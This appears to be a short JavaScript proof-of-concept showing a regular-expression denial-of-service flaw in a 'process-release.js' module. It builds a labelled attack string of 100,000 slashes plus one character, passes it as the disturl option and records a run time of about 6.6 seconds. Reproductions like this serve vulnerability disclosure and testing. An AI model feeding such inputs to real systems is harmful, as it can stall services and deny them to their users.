const processRelease = require("./process-release.js");

//Attack String :""+"/"*100000+"◎"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "/";
}
str += "◎";

const gyp = {
  opts: {
    disturl: str,
    target: "",
  },
};
console.log(processRelease("", gyp, "", ""));

// real    0m6.601s
// user    0m6.569s
// sys     0m0.010s
